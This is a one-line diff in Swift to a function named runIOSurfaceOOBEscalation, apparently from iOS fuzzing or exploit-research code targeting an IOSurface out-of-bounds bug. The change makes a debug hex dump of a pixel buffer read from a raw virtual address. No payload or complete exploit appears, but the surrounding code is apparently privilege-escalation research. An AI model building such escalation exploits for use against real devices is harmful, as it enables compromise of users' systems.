@@ -2543,7 +2543,7 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
             step("── pixel buf dump (first 256B) ──")
             let dumpLen = min(256, allocSz)
             var hexLine = ""
-            let surfPtr = surfBaseRaw.assumingMemoryBound(to: UInt8.self)
+            let surfPtr = UnsafeMutableRawPointer(bitPattern: surfVA)!.assumingMemoryBound(to: UInt8.self)
             for i in 0..<dumpLen {
                 if i % 16 == 0 { if !hexLine.isEmpty { step("  \(hexLine)") }; hexLine = String(format: "+0x%04x: ", i) }
                 hexLine += String(format: "%02x ", surfPtr[i])
